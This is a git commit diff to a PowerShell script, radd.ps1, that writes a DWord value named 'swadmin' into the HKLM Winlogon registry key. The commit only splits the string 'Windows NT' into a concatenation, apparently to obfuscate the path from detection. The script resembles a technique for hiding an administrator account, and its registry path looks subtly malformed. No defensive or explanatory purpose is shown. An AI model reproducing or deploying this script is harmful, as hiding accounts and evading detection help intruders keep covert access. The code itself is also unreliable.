15427a4914d44ace3add6697956a41377733ce33
tobiasasa <tobias.asa@hotmail.com>
2022-09-22 15:41:59 -0700

    asd123

--- resources/radd.ps1
+++ resources/radd.ps1
@@ -1,3 +1,3 @@
-$path1 = '\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+$path1 = '\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows' + ' ' + 'NT\CurrentVersion\Winlogon'
 New-item -Path $path1 -Force
 New-ItemProperty -Path $path1 -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
